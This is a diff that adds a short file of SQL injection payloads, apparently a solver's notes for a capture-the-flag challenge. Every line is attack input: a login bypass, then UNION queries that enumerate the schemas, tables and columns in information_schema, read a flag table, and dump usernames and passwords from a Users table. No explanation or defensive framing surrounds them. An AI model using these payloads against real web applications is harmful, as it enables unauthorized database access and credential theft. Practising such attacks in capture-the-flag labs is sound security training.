@@ -1,0 +1,13 @@
+' or 1=1 #'
+
+'union select 1,2,3,4#
+
+'union select 1,schema_name,3,4 from information_schema.schemata#
+
+'union select 1, table_name,3,4 from information_schema.tables where TABLE_SCHEMA='Secure'#
+
+'union select 1,column_name,3,4 from information_schema.columns where table_schema = "Secure" and table_name="Flag"#
+
+'union select 1,string,3,4 from Secure.Flag#
+
+'union select Id,Password,Username,Website from Secure.Users#
